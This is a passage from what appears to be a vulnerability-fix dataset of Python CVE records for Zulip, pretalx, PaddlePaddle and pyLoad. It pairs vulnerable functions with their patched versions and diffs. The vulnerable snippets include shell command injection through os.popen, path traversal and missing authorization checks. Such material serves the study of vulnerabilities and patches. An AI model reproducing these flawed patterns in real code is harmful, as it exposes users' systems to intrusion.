  if ret_error is not None:\n        return json_error(data=error_data, msg=ret_error)\n    else:\n        return json_success()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_201_1",
        "commit": "1f48fa2",
        "file_path": "zerver/views/invite.py",
        "start_line": 22,
        "end_line": 58,
        "snippet": "def json_invite_users(request, user_profile,\n                      invitee_emails_raw=REQ(\"invitee_emails\"),\n                      body=REQ(\"custom_body\", default=None)):\n    # type: (HttpRequest, UserProfile, str, Optional[str]) -> HttpResponse\n    if user_profile.realm.invite_by_admins_only and not user_profile.is_realm_admin:\n        return json_error(_(\"Must be a realm administrator\"))\n    if not invitee_emails_raw:\n        return json_error(_(\"You must specify at least one email address.\"))\n    if body == '':\n        body = None\n\n    invitee_emails = get_invitee_emails_set(invitee_emails_raw)\n\n    stream_names = request.POST.getlist('stream')\n    if not stream_names:\n        return json_error(_(\"You must specify at least one stream for invitees to join.\"))\n\n    # We unconditionally sub you to the notifications stream if it\n    # exists and is public.\n    notifications_stream = user_profile.realm.notifications_stream  # type: Optional[Stream]\n    if notifications_stream and not notifications_stream.invite_only:\n        stream_names.append(notifications_stream.name)\n\n    streams = []  # type: List[Stream]\n    for stream_name in stream_names:\n        try:\n            (stream, recipient, sub) = access_stream_by_name(user_profile, stream_name)\n        except JsonableError:\n            return json_error(_(\"Stream does not exist: %s. No invites were sent.\") % (stream_name,))\n        streams.append(stream)\n\n    ret_error, error_data = do_invite_users(user_profile, invitee_emails, streams, body)\n\n    if ret_error is not None:\n        return json_error(data=error_data, msg=ret_error)\n    else:\n        return json_success()"
      }
    ],
    "vul_patch": "--- a/zerver/views/invite.py\n+++ b/zerver/views/invite.py\n@@ -2,6 +2,8 @@\n                       invitee_emails_raw=REQ(\"invitee_emails\"),\n                       body=REQ(\"custom_body\", default=None)):\n     # type: (HttpRequest, UserProfile, str, Optional[str]) -> HttpResponse\n+    if user_profile.realm.invite_by_admins_only and not user_profile.is_realm_admin:\n+        return json_error(_(\"Must be a realm administrator\"))\n     if not invitee_emails_raw:\n         return json_error(_(\"You must specify at least one email address.\"))\n     if body == '':\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-28459",
    "cve_description": "pretalx 2.3.1 before 2.3.2 allows path traversal in HTML export (a non-default feature). Users were able to upload crafted HTML documents that trigger the reading of arbitrary files.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/pretalx/pretalx",
    "patch_url": [
      "https://github.com/pretalx/pretalx/commit/60722c43cf975f319e94102e6bff320723776890"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_298_1",
        "commit": "4732e8f",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 112,
        "end_line": 123,
        "snippet": "def dump_content(destination, path, getter):\n    logging.debug(path)\n    content = getter(path)\n    if path.endswith(\"/\"):\n        path = path + \"index.html\"\n\n    path = Path(destination) / path.lstrip(\"/\")\n    path.parent.mkdir(parents=True, exist_ok=True)\n\n    with open(path, \"wb\") as f:\n        f.write(content)\n    return content"
      },
      {
        "id": "vul_py_298_2",
        "commit": "4732e8f",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 126,
        "end_line": 135,
        "snippet": "def get_mediastatic_content(url):\n    if url.startswith(settings.STATIC_URL):\n        local_path = settings.STATIC_ROOT / url[len(settings.STATIC_URL) :]\n    elif url.startswith(settings.MEDIA_URL):\n        local_path = settings.MEDIA_ROOT / url[len(settings.MEDIA_URL) :]\n    else:\n        raise FileNotFoundError()\n\n    with open(local_path, \"rb\") as f:\n        return f.read()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_298_1",
        "commit": "60722c43cf975f319e94102e6bff320723776890",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 112,
        "end_line": 125,
        "snippet": "def dump_content(destination, path, getter):\n    logging.debug(path)\n    content = getter(path)\n    if path.endswith(\"/\"):\n        path = path + \"index.html\"\n\n    path = (Path(destination) / path.lstrip(\"/\")).resolve()\n    if not Path(destination) in path.parents:\n        raise CommandError(\"Path traversal detected, aborting.\")\n    path.parent.mkdir(parents=True, exist_ok=True)\n\n    with open(path, \"wb\") as f:\n        f.write(content)\n    return content"
      },
      {
        "id": "fix_py_298_2",
        "commit": "60722c43cf975f319e94102e6bff320723776890",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 128,
        "end_line": 145,
        "snippet": "def get_mediastatic_content(url):\n    if url.startswith(settings.STATIC_URL):\n        local_path = settings.STATIC_ROOT / url[len(settings.STATIC_URL) :]\n    elif url.startswith(settings.MEDIA_URL):\n        local_path = settings.MEDIA_ROOT / url[len(settings.MEDIA_URL) :]\n    else:\n        raise FileNotFoundError()\n\n    # Prevent directory traversal, make sure the path is inside the media or static root\n    local_path = local_path.resolve(strict=True)\n    if not any(\n        path in local_path.parents\n        for path in (settings.MEDIA_ROOT, settings.STATIC_ROOT)\n    ):\n        raise FileNotFoundError()\n\n    with open(local_path, \"rb\") as f:\n        return f.read()"
      }
    ],
    "vul_patch": "--- a/src/pretalx/agenda/management/commands/export_schedule_html.py\n+++ b/src/pretalx/agenda/management/commands/export_schedule_html.py\n@@ -4,7 +4,9 @@\n     if path.endswith(\"/\"):\n         path = path + \"index.html\"\n \n-    path = Path(destination) / path.lstrip(\"/\")\n+    path = (Path(destination) / path.lstrip(\"/\")).resolve()\n+    if not Path(destination) in path.parents:\n+        raise CommandError(\"Path traversal detected, aborting.\")\n     path.parent.mkdir(parents=True, exist_ok=True)\n \n     with open(path, \"wb\") as f:\n\n--- a/src/pretalx/agenda/management/commands/export_schedule_html.py\n+++ b/src/pretalx/agenda/management/commands/export_schedule_html.py\n@@ -6,5 +6,13 @@\n     else:\n         raise FileNotFoundError()\n \n+    # Prevent directory traversal, make sure the path is inside the media or static root\n+    local_path = local_path.resolve(strict=True)\n+    if not any(\n+        path in local_path.parents\n+        for path in (settings.MEDIA_ROOT, settings.STATIC_ROOT)\n+    ):\n+        raise FileNotFoundError()\n+\n     with open(local_path, \"rb\") as f:\n         return f.read()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-52310",
    "cve_description": "PaddlePaddle before 2.6.0 has a command injection in get_online_pass_interval. This resulted in the ability to execute arbitrary commands on the operating system.\n\n\n\n\n\n\n\n",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/PaddlePaddle/Paddle",
    "patch_url": [
      "https://github.com/PaddlePaddle/Paddle/commit/49bec176053595975c1941cff9749c55f7203ea9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_371_1",
        "commit": "5252c5d358807edcb5b61b06e4853b894478c0bf",
        "file_path": "python/paddle/incubate/distributed/fleet/fleet_util.py",
        "start_line": 1290,
        "end_line": 1353,
        "snippet": "    def get_online_pass_interval(\n        self, days, hours, split_interval, split_per_pass, is_data_hourly_placed\n    ):\n        \"\"\"\n        get online pass interval\n\n        Args:\n            days(str): days to train\n            hours(str): hours to train\n            split_interval(int|str): split interval\n            split_per_pass(int}str): split per pass\n            is_data_hourly_placed(bool): is data hourly placed\n\n        Returns:\n            online_pass_interval(list)\n\n        Examples:\n            .. code-block:: python\n\n                >>> # doctest: +REQUIRES(env:DISTRIBUTED)\n                >>> from paddle.incubate.distributed.fleet.fleet_util import FleetUtil\n                >>> fleet_util = FleetUtil()\n                >>> online_pass_interval = fleet_util.get_online_pass_interval(\n                ...     days=\"{20190720..20190729}\",\n                ...     hours=\"{0..23}\",\n                ...     split_interval=5,\n                ...     split_per_pass=2,\n                ...     is_data_hourly_placed=False)\n\n        \"\"\"\n        days = os.popen(\"echo -n \" + days).read().split(\" \")\n        hours = os.popen(\"echo -n \" + hours).read().split(\" \")\n        split_interval = int(split_interval)\n        split_per_pass = int(split_per_pass)\n        splits_per_day = (\n            (int(hours[-1]) - int(hours[0]) + 1) * 60 // split_interval\n        )\n        pass_per_day = splits_per_day // split_per_pass\n        left_train_hour = int(hours[0])\n        right_train_hour = int(hours[-1])\n\n        start = 0\n        split_path = []\n        for i in range(splits_per_day):\n            h = start // 60\n            m = start % 60\n            if h < left_train_hour or h > right_train_hour:\n                start += split_interval\n                continue\n            if is_data_hourly_placed:\n                split_path.append(\"%02d\" % h)\n            else:\n                split_path.append(\"%02d%02d\" % (h, m))\n            start += split_interval\n\n        start = 0\n        online_pass_interval = []\n        for i in range(pass_per_day):\n            online_pass_interval.append([])\n            for j in range(start, start + split_per_pass):\n                online_pass_interval[i].append(split_path[j])\n            start += split_per_pass\n\n        return online_pass_interval"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_371_1",
        "commit": "49bec176053595975c1941cff9749c55f7203ea9",
        "file_path": "python/paddle/incubate/distributed/fleet/fleet_util.py",
        "start_line": 1290,
        "end_line": 1369,
        "snippet": "    def get_online_pass_interval(\n        self, days, hours, split_interval, split_per_pass, is_data_hourly_placed\n    ):\n        \"\"\"\n        get online pass interval\n\n        Args:\n            days(str): days to train\n            hours(str): hours to train\n            split_interval(int|str): split interval\n            split_per_pass(int}str): split per pass\n            is_data_hourly_placed(bool): is data hourly placed\n\n        Returns:\n            online_pass_interval(list)\n\n        Examples:\n            .. code-block:: python\n\n                >>> # doctest: +REQUIRES(env:DISTRIBUTED)\n                >>> from paddle.incubate.distributed.fleet.fleet_util import FleetUtil\n                >>> fleet_util = FleetUtil()\n                >>> online_pass_interval = fleet_util.get_online_pass_interval(\n                ...     days=\"{20190720..20190729}\",\n                ...     hours=\"{0..23}\",\n                ...     split_interval=5,\n                ...     split_per_pass=2,\n                ...     is_data_hourly_placed=False)\n\n        \"\"\"\n        assert (\n            \"|\" not in days\n            and \";\" not in days\n            and \"\\\\\" not in days\n            and \"/\" not in days\n            and \"(\" not in days\n            and \")\" not in days\n        ), r\"days should not contain [|,;,\\,/,(,)]\"\n        days = os.popen(\"echo -n \" + days).read().split(\" \")\n        assert (\n            \"|\" not in hours\n            and \";\" not in hours\n            and \"\\\\\" not in hours\n            and \"/\" not in hours\n            and \"(\" not in hours\n            and \")\" not in days\n        ), r\"hours should not contain [|,;,\\,/,(,)]\"\n        hours = os.popen(\"echo -n \" + hours).read().split(\" \")\n        split_interval = int(split_interval)\n        split_per_pass = int(split_per_pass)\n        splits_per_day = (\n            (int(hours[-1]) - int(hours[0]) + 1) * 60 // split_interval\n        )\n        pass_per_day = splits_per_day // split_per_pass\n        left_train_hour = int(hours[0])\n        right_train_hour = int(hours[-1])\n\n        start = 0\n        split_path = []\n        for i in range(splits_per_day):\n            h = start // 60\n            m = start % 60\n            if h < left_train_hour or h > right_train_hour:\n                start += split_interval\n                continue\n            if is_data_hourly_placed:\n                split_path.append(\"%02d\" % h)\n            else:\n                split_path.append(\"%02d%02d\" % (h, m))\n            start += split_interval\n\n        start = 0\n        online_pass_interval = []\n        for i in range(pass_per_day):\n            online_pass_interval.append([])\n            for j in range(start, start + split_per_pass):\n                online_pass_interval[i].append(split_path[j])\n            start += split_per_pass\n\n        return online_pass_interval"
      }
    ],
    "vul_patch": "--- a/python/paddle/incubate/distributed/fleet/fleet_util.py\n+++ b/python/paddle/incubate/distributed/fleet/fleet_util.py\n@@ -28,7 +28,23 @@\n                 ...     is_data_hourly_placed=False)\n \n         \"\"\"\n+        assert (\n+            \"|\" not in days\n+            and \";\" not in days\n+            and \"\\\\\" not in days\n+            and \"/\" not in days\n+            and \"(\" not in days\n+            and \")\" not in days\n+        ), r\"days should not contain [|,;,\\,/,(,)]\"\n         days = os.popen(\"echo -n \" + days).read().split(\" \")\n+        assert (\n+            \"|\" not in hours\n+            and \";\" not in hours\n+            and \"\\\\\" not in hours\n+            and \"/\" not in hours\n+            and \"(\" not in hours\n+            and \")\" not in days\n+        ), r\"hours should not contain [|,;,\\,/,(,)]\"\n         hours = os.popen(\"echo -n \" + hours).read().split(\" \")\n         split_interval = int(split_interval)\n         split_per_pass = int(split_per_pass)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-47821",
    "cve_description": "pyLoad is a free and open-source Download Manager. The folder `/.pyload/scripts` has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved in versions prior to 0.5.0b3.dev87. A file can be downloaded to such a folder by changing the download folder to a folder in `/scripts` path and using the `/flashgot` API to download the file. This vulnerability allows an attacker with access to change the settings on a pyload server to execute arbitrary code and completely compromise the system. Version 0.5.0b3.dev87 fixes this issue.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pyload/pyload",
    "patch_url": [
      "https://github.com/pyload/pyload/commit/48f59567393a19263c8a0285256a7537dc9ce109"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_311_1",
        "commit": "946c256",
        "file_path": "src/pyload/core/__init__.py",
        "start_line": 114,
        "end_line": 144,
        "snippet": "    def _init_config(self, userdir, tempdir, storagedir, debug):\n        from .config.parser import ConfigParser\n\n        self.userdir = os.path.realpath(userdir)\n        self.tempdir = os.path.realpath(tempdir)\n        os.makedirs(self.userdir, exist_ok=True)\n        os.makedirs(self.tempdir, exist_ok=True)\n\n        self.config = ConfigParser(self.userdir)\n\n        if debug is None:\n            if self.config.get(\"general\", \"debug_mode\"):\n                debug_level = self.config.get(\"general\", \"debug_level\")\n                self._debug = self.DEBUG_LEVEL_MAP[debug_level]\n        else:\n            self._debug = max(0, int(debug))\n\n        # If no argument set, read storage dir from config file,\n        # otherwise save setting to config dir\n        if storagedir is None:\n            storagedir = self.config.get(\"general\", \"storage_folder\")\n            # Make sure storage_folder is not empty\n            if not storagedir:\n                self.config.set(\"general\", \"storage_folder\", \"~/Downloads/pyLoad\")\n                storagedir = self.config.get(\"general\", \"storage_folder\")\n        else:\n            self.config.set(\"general\", \"storage_folder\", storagedir)\n        os.makedirs(storagedir, exist_ok=True)\n\n        if not self._dry_run:\n            self.config.save()  #: save so config files gets filled"
      },
      {
        "id": "vul_py_311_2",
        "commit": "946c256",
        "file_path": "src/pyload/core/api/__init__.py",
        "start_line": 174,
        "end_line": 197,
        "snippet": "    def set_config_value(self, category, option, value, section=\"core\"):\n        \"\"\"\n        Set new config value.\n\n        :param category:\n        :param option:\n        :param value: new config value\n        :param section: 'plugin' or 'core\n        \"\"\"\n        self.pyload.addon_manager.dispatch_event(\n            \"config_changed\", category, option, value, section\n        )\n\n        if section == \"core\":\n            self.pyload.config[category][option] = value\n\n            if option in (\n                \"limit_speed\",\n                \"max_speed\",\n            ):  #: not so nice to update the limit\n                self.pyload.request_factory.update_bucket()\n\n        elif section == \"plugin\":\n            self.pyload.config.set_plugin(category, option, value)"
      },
      {
        "id": "vul_py_311_3",
        "commit": "946c256",
        "file_path": "src/pyload/webui/app/blueprints/json_blueprint.py",
        "start_line": 262,
        "end_line": 282,
        "snippet": "def save_config():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    category = flask.request.args.get('category')\n    if category not in (\"core\", \"plugin\"):\n        return jsonify(False), 500\n\n    for key, value in flask.request.form.items():\n        try:\n            section, option = key.split(\"|\")\n        except Exception:\n            continue\n\n        if section == 'general' and option=='storage_folder':\n            abs_path_value = os.path.join(os.path.abspath(value).lower(), \"\")\n            abs_PKGDIR = os.path.join(os.path.abspath(PKGDIR).lower(), \"\")\n            if abs_path_value.startswith(abs_PKGDIR):\n                continue\n\n        api.set_config_value(section, option, value, category)\n\n    return jsonify(True)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_311_1",
        "commit": "48f59567393a19263c8a0285256a7537dc9ce109",
        "file_path": "src/pyload/core/__init__.py",
        "start_line": 114,
        "end_line": 155,
        "snippet": "    def _init_config(self, userdir, tempdir, storagedir, debug):\n        from .config.parser import ConfigParser\n\n        self.userdir = os.path.realpath(userdir)\n        self.tempdir = os.path.realpath(tempdir)\n        os.makedirs(self.userdir, exist_ok=True)\n        os.makedirs(self.tempdir, exist_ok=True)\n\n        self.config = ConfigParser(self.userdir)\n\n        if debug is None:\n            if self.config.get(\"general\", \"debug_mode\"):\n                debug_level = self.config.get(\"general\", \"debug_level\")\n                self._debug = self.DEBUG_LEVEL_MAP[debug_level]\n        else:\n            self._debug = max(0, int(debug))\n\n        # If no argument set, read storage dir from config file,\n        # otherwise save setting to config dir\n        if storagedir is None:\n            storagedir = self.config.get(\"general\", \"storage_folder\")\n\n        else:\n            self.config.set(\"general\", \"storage_folder\", storagedir)\n\n        # Make sure storage_folder is not empty\n        # and also not inside dangerous locations\n        correct_case = lambda x: x.lower() if os.name == \"nt\" else x\n        directories = [\n            correct_case(os.path.join(os.path.realpath(d), \"\") )\n            for d in [storagedir or PKGDIR, PKGDIR, userdir]\n        ]\n        is_bad_dir = any(directories[0].startswith(d) for d in directories[1:])\n\n        if not storagedir or is_bad_dir:\n            self.config.set(\"general\", \"storage_folder\", \"~/Downloads/pyLoad\")\n            storagedir = self.config.get(\"general\", \"storage_folder\")\n\n        os.makedirs(storagedir, exist_ok=True)\n\n        if not self._dry_run:\n            self.config.save()  #: save so config files gets filled"
      },
      {
        "id": "fix_py_311_2",
        "commit": "48f59567393a19263c8a0285256a7537dc9ce109",
        "file_path": "src/pyload/core/api/__init__.py",
        "start_line": 176,
        "end_line": 209,
        "snippet": "    def set_config_value(self, category, option, value, section=\"core\"):\n        \"\"\"\n        Set new config value.\n\n        :param category:\n        :param option:\n        :param value: new config value\n        :param section: 'plugin' or 'core\n        \"\"\"\n        self.pyload.addon_manager.dispatch_event(\n            \"config_changed\", category, option, value, section\n        )\n\n        if section == \"core\":\n            if category == \"general\" and option == \"storage_folder\":\n                # Forbid setting the download folder inside dangerous locations\n                correct_case = lambda x: x.lower() if os.name == \"nt\" else x\n                directories = [\n                    correct_case(os.path.join(os.path.realpath(d), \"\"))\n                    for d in [value, PKGDIR, self.pyload.userdir]\n                ]\n                if any(directories[0].startswith(d) for d in directories[1:]):\n                    return\n\n            self.pyload.config.set(category, option, value)\n\n            if category == \"download\" and option in (\n                \"limit_speed\",\n                \"max_speed\",\n            ):  #: not such a nice method to update the limit\n                self.pyload.request_factory.update_bucket()\n\n        elif section == \"plugin\":\n            self.pyload.config.set_plugin(category, option, value)"
      },
      {
        "id": "fix_py_311_3",
        "commit": "48f59567393a19263c8a0285256a7537dc9ce109",
        "file_path": "src/pyload/webui/app/blueprints/json_blueprint.py",
        "start_line": 262,
        "end_line": 276,
        "snippet": "def save_config():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    category = flask.request.args.get('category')\n    if category not in (\"core\", \"plugin\"):\n        return jsonify(False), 500\n\n    for key, value in flask.request.form.items():\n        try:\n            section, option = key.split(\"|\")\n        except ValueError:\n            continue\n\n        api.set_config_value(section, option, value, category)\n\n    return jsonify(True)"
      }
    ],
    "vul_patch": "--- a/src/pyload/core/__init__.py\n+++ b/src/pyload/core/__init__.py\n@@ -19,12 +19,23 @@\n         # otherwise save setting to config dir\n         if storagedir is None:\n             storagedir = self.config.get(\"general\", \"storage_folder\")\n-            # Make sure storage_folder is not empty\n-            if not storagedir:\n-                self.config.set(\"general\", \"storage_folder\", \"~/Downloads/pyLoad\")\n-                storagedir = self.config.get(\"general\", \"storage_folder\")\n+\n         else:\n             self.config.set(\"general\", \"storage_folder\", storagedir)\n+\n+        # Make sure storage_folder is not empty\n+        # and also not inside dangerous locations\n+        correct_case = lambda x: x.lower() if os.name == \"nt\" else x\n+        directories = [\n+            correct_case(os.path.join(os.path.realpath(d), \"\") )\n+            for d in [storagedir or PKGDIR, PKGDIR, userdir]\n+        ]\n+        is_bad_dir = any(directories[0].startswith(d) for d in directories[1:])\n+\n+        if not storagedir or is_bad_dir:\n+            self.config.set(\"general\", \"storage_folder\", \"~/Downloads/pyLoad\")\n+            storagedir = self.config.get(\"general\", \"storage_folder\")\n+\n         os.makedirs(storagedir, exist_ok=True)\n \n         if not self._dry_run:\n\n--- a/src/pyload/core/api/__init__.py\n+++ b/src/pyload/core/api/__init__.py\n@@ -12,12 +12,22 @@\n         )\n \n         if section == \"core\":\n-            self.pyload.config[category][option] = value\n+            if category == \"general\" and option == \"storage_folder\":\n+                # Forbid setting the download folder inside dangerous locations\n+                correct_case = lambda x: x.lower() if os.name == \"nt\" else x\n+                directories = [\n+                    correct_case(os.path.join(os.path.realpath(d), \"\"))\n+                    for d in [value, PKGDIR, self.pyload.userdir]\n+                ]\n+                if any(directories[0].startswith(d) for d in directories[1:]):\n+                    return\n \n-            if option in (\n+            self.pyload.config.set(category, option, value)\n+\n+            if category == \"download\" and option in (\n                 \"limit_speed\",\n                 \"max_speed\",\n-            ):  #: not so nice to update the limit\n+            ):  #: not such a nice method to update the limit\n                 self.pyload.request_factory.update_bucket()\n \n         elif section == \"plugin\":\n\n--- a/src/pyload/webui/app/blueprints/json_blueprint.py\n+++ b/src/pyload/webui/app/blueprints/json_blueprint.py\n@@ -7,14 +7,8 @@\n     for key, value in flask.request.form.items():\n         try:\n             section, option = key.split(\"|\")\n-        except Exception:\n+        except ValueError:\n             continue\n-\n-        if section == 'general' and option=='storage_folder':\n-            abs_path_value = os.path.join(os.path.abspath(value).lower(), \"\")\n-            abs_PKGDIR = os.path.join(os.path.abspath(PKGDIR).lower(), \"\")\n-            if abs_path_value.startswith(abs_PKGDIR):\n-                continue\n \n         api.set_config_value(section, option, value, category)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-47930",
    "cve_description": "Zulip is an open-source team chat application. Starting in version 10.0 and prior to version 10.3, the \"Who can create public channels\" access control mechanism can be circumvented by creating a private or web-public channel, and then changing the channel privacy to public. A similar technique works for creating private channels without permission, though such a process requires either the API or modifying the HTML, as we do mark the \"private\" radio button as disabled in such cases. Version 10.3 contains a patch.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/d2ff4bda4c3efa30fc3ab1f151255cfdbf370f78"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_75_1",
        "commit": "d3b9dfa",
        "file_path": "zerver/views/streams.py",
        "start_line": "259",
        "end_line": "455",
        "snippet": "def update_stream_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    *,\n    stream_id: PathOnly[int],\n    description: Annotated[str, StringConstraints(max_length=Stream.MAX_DESCRIPTION_LENGTH)]\n    | None = None,\n    is_private: Json[bool] | None = None,\n    is_default_stream: Json[bool] | None = None,\n    history_public_to_subscribers: Json[bool] | None = None,\n    is_web_public: Json[bool] | None = None,\n    new_name: str | None = None,\n    message_retention_days: Json[str] | Json[int] | None = None,\n    can_add_subscribers_group: Json[GroupSettingChangeRequest] | None = None,\n    can_administer_channel_group: Json[GroupSettingChangeRequest] | None = None,\n    can_send_message_group: Json[GroupSettingChangeRequest] | None = None,\n    can_remove_subscribers_group: Json[GroupSettingChangeRequest] | None = None,\n    can_subscribe_group: Json[GroupSettingChangeRequest] | None = None,\n) -> HttpResponse:\n    # Most settings updates only require metadata access, not content\n    # access. We will check for content access further when and where\n    # required.\n    (stream, sub) = access_stream_for_delete_or_update_requiring_metadata_access(\n        user_profile, stream_id\n    )\n    user_group_membership_details = UserGroupMembershipDetails(user_recursive_group_ids=None)\n\n    # Validate that the proposed state for permissions settings is permitted.\n    if is_private is not None:\n        proposed_is_private = is_private\n    else:\n        proposed_is_private = stream.invite_only\n\n    if is_web_public is not None:\n        proposed_is_web_public = is_web_public\n    else:\n        proposed_is_web_public = stream.is_web_public\n\n    if is_default_stream is not None:\n        proposed_is_default_stream = is_default_stream\n    else:\n        default_stream_ids = get_default_stream_ids_for_realm(stream.realm_id)\n        proposed_is_default_stream = stream.id in default_stream_ids\n\n    if stream.realm.is_zephyr_mirror_realm:\n        # In the Zephyr mirroring model, history is unconditionally\n        # not public to subscribers, even for public streams.\n        proposed_history_public_to_subscribers = False\n    elif history_public_to_subscribers is not None:\n        proposed_history_public_to_subscribers = history_public_to_subscribers\n    elif is_private is not None:\n        # By default, private streams have protected history while for\n        # public streams history is public by default.\n        proposed_history_public_to_subscribers = not is_private\n    else:\n        proposed_history_public_to_subscribers = stream.history_public_to_subscribers\n\n    # Web-public streams must have subscriber-public history.\n    if proposed_is_web_public and not proposed_history_public_to_subscribers:\n        raise JsonableError(_(\"Invalid parameters\"))\n\n    # Web-public streams must not be private.\n    if proposed_is_web_public and proposed_is_private:\n        raise JsonableError(_(\"Invalid parameters\"))\n\n    # Public streams must be public to subscribers.\n    if not proposed_is_private and not proposed_history_public_to_subscribers:\n        if stream.realm.is_zephyr_mirror_realm:\n            # All Zephyr realm streams violate this rule.\n            pass\n        else:\n            raise JsonableError(_(\"Invalid parameters\"))\n\n    # Ensure that a stream cannot be both a default stream for new users and private\n    if proposed_is_private and proposed_is_default_stream:\n        raise JsonableError(_(\"A default channel cannot be private.\"))\n\n    # Ensure that a moderation request channel isn't set to public.\n    if not proposed_is_private and user_profile.realm.moderation_request_channel == stream:\n        raise JsonableError(_(\"Moderation request channel must be private.\"))\n\n    if is_private is not None and not user_has_content_access(\n        user_profile,\n        stream,\n        user_group_membership_details,\n        is_subscribed=sub is not None,\n    ):\n        raise JsonableError(_(\"Channel content access is required.\"))\n        # In addition to channel administration permissions, changing\n        # public/private status for channels requires content access\n        # to the channel.\n\n    # Enforce restrictions on creating web-public streams. Since these\n    # checks are only required when changing a stream to be\n    # web-public, we don't use an \"is not None\" check.\n    if is_web_public:\n        if not user_profile.realm.web_public_streams_enabled():\n            raise JsonableError(_(\"Web-public channels are not enabled.\"))\n        if not user_profile.can_create_web_public_streams():\n            raise JsonableError(_(\"Insufficient permission\"))\n\n    if (\n        is_private is not None\n        or is_web_public is not None\n        or history_public_to_subscribers is not None\n    ):\n        do_change_stream_permission(\n            stream,\n            invite_only=proposed_is_private,\n            history_public_to_subscribers=proposed_history_public_to_subscribers,\n            is_web_public=proposed_is_web_public,\n            acting_user=user_profile,\n        )\n\n    if is_default_stream is not None:\n        if not user_profile.can_manage_default_streams():\n            raise CannotManageDefaultChannelError\n        if is_default_stream:\n            do_add_default_stream(stream)\n        else:\n            do_remove_default_stream(stream)\n\n    if message_retention_days is not None:\n        if not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequiredError\n        user_profile.realm.ensure_not_on_limited_plan()\n        new_message_retention_days_value = parse_message_retention_days(\n            message_retention_days, Stream.MESSAGE_RETENTION_SPECIAL_VALUES_MAP\n        )\n        do_change_stream_message_retention_days(\n            stream, user_profile, new_message_retention_days_value\n        )\n\n    if description is not None:\n        if \"\\n\" in description:\n            # We don't allow newline characters in stream descriptions.\n            description = description.replace(\"\\n\", \" \")\n        do_change_stream_description(stream, description, acting_user=user_profile)\n    if new_name is not None:\n        new_name = new_name.strip()\n        if stream.name == new_name:\n            raise JsonableError(_(\"Channel already has that name.\"))\n        if stream.name.lower() != new_name.lower():\n            # Check that the stream name is available (unless we are\n            # are only changing the casing of the stream name).\n            check_stream_name_available(user_profile.realm, new_name)\n        do_rename_stream(stream, new_name, user_profile)\n\n    nobody_group = get_system_user_group_by_name(SystemGroups.NOBODY, user_profile.realm_id)\n    request_settings_dict = locals()\n    for setting_name, permission_configuration in Stream.stream_permission_group_settings.items():\n        assert setting_name in request_settings_dict\n        if request_settings_dict[setting_name] is None:\n            continue\n\n        setting_value = request_settings_dict[setting_name]\n        new_setting_value = parse_group_setting_value(setting_value.new, nobody_group)\n\n        expected_current_setting_value = None\n        if setting_value.old is not None:\n            expected_current_setting_value = parse_group_setting_value(\n                setting_value.old, nobody_group\n            )\n\n        current_value = getattr(stream, setting_name)\n        current_setting_api_value = get_group_setting_value_for_api(current_value)\n\n        if validate_group_setting_value_change(\n            